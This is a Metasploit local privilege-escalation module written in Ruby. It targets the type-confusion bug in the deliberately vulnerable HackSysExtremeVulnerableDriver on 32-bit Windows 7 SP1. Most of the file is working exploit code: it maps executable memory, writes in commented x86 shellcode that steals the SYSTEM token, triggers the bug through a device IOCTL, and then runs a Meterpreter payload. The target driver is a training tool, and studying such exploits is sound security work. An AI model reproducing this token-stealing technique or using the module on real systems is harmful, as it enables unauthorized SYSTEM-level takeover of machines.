##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/local/windows_kernel'

class MetasploitModule < Msf::Exploit::Local
	Rank = NormalRanking

	include Msf::Exploit::Local::WindowsKernel
	include Msf::Post::File
	include Msf::Post::Windows::FileInfo
	include Msf::Post::Windows::Priv
	include Msf::Post::Windows::Process

	def initialize(info={})
		super(update_info(info, {
			'Name'              => 'HEVD TypeConfusion',
			'Description'       => %q{This flaw can be abused to elevate privileges to SYSTEM.},
			'License'           => MSF_LICENSE,
			'Author'            => ['dphz'],
			'Arch'              => ARCH_X86,
			'Platform'			=> 'win',
			'SessionTypes'	    => [ 'meterpreter' ],
			'DefaultOptions'    =>{'EXITFUNC' => 'thread'},
			'Targets'        =>
				[
				  [ 'Windows 7 SP1',
					{
					  'HaliQuerySystemInfo' => 0x16bba, # Stable over Windows XP SP3 updates
					  '_KPROCESS'           => "\x50",  # Offset to _KPROCESS from a _ETHREAD struct
					  '_TOKEN'              => "\xf8",  # Offset to TOKEN from the _EPROCESS struct
					  '_UPID'               => "\xb4",  # Offset to UniqueProcessId FROM the _EPROCESS struct
					  '_APLINKS'            => "\xb8"   # Offset to ActiveProcessLinks _EPROCESS struct
					}
				  ]
				],
			'References'		=>
				[
					['URL', 'https://github.com/dongpohezui/HEVD_exp']
					],
			'DisclosureDate'=> '2021',
			'DefaultTarget' => 0
		}))

	end

	def check
		
		handle = open_device('\\\\.\\HackSysExtremeVulnerableDriver', 0, 'FILE_SHARE_READ', 'OPEN_EXISTING')
		return Exploit::CheckCode::Safe unless handle

		session.railgun.kernel32.CloseHandle(handle)

		return Exploit::CheckCode::Appears
	end

	def exploit
		if is_system?
			fail_with(Failure::None, 'Session is already elevated')
		end
		
		if check == Exploit::CheckCode::Safe
			fail_with(Failure::NotVulnerable, "Exploit not available on this system")
		end

		handle = open_device('\\\\.\\HackSysExtremeVulnerableDriver', 0, 'FILE_SHARE_READ', 'OPEN_EXISTING')
		if handle.nil?
			fail_with(Failure::NoTarget, "Unable to open \\\\.\\HackSysExtremeVulnerableDriver device")
		end

		print_status("Storing the shellcode in memory...")
		this_proc = session.sys.process.open

		session.railgun.ntdll.NtAllocateVirtualMemory(-1, [0x1000].pack('V'), nil, [0x3000].pack('V'), "MEM_RESERVE|MEM_COMMIT", "PAGE_EXECUTE_READWRITE")

		unless this_proc.memory.writable?(0x1000)
			fail_with(Failure::Unknown, 'Failed to allocate memory')
		end

		sc	= "\x90"*5
		sc << "\x60"                            # pushad
		sc << "\x31\xc0"                        # xor eax,eax
		sc << "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
		sc << "\x8b\x40\x50"                    # mov eax,[eax+0x50]
		sc << "\x89\xc1"                        # mov ecx,eax
		sc << "\xba\x04\x00\x00\x00"            # mov edx,0x4
		sc << "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
		sc << "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
		sc << "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
		sc << "\x75\xed"                        # jnz 0x1a
		sc << "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]
		sc << "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
		sc << "\x61"                            # popad
		sc << "\x31\xc0"                        # xor eax,eax
		sc << "\x5d"                            # pop ebp
		sc << "\xc2\x08\x00"                    # ret 0x8
		
		print_status("write shellcode...")
		this_proc.memory.write(0x1000, sc)
		this_proc.memory.write(0x1100, "\x01\x00\x00\x00")
		this_proc.memory.write(0x1104, "\x00\x10\x00\x00")
		
		print_status("Triggering the vulnerability...")
		session.railgun.ntdll.NtDeviceIoControlFile(handle, nil, nil, nil, 4, 0x222023, 0x1100, 0x8, 0, 0)
		#session.railgun.kernel32.CloseHandle(handle) # CloseHandle will never return, so skip it

		print_status("Checking privileges after exploitation...")

		unless is_system?
			fail_with(Failure::Unknown, "The exploitation wasn't successful")
		end

		print_good("Exploitation successful!")
		unless execute_shellcode(payload.encoded, nil, this_proc.pid)
			fail_with(Failure::Unknown, 'Error while executing the payload')
		end
	end
end
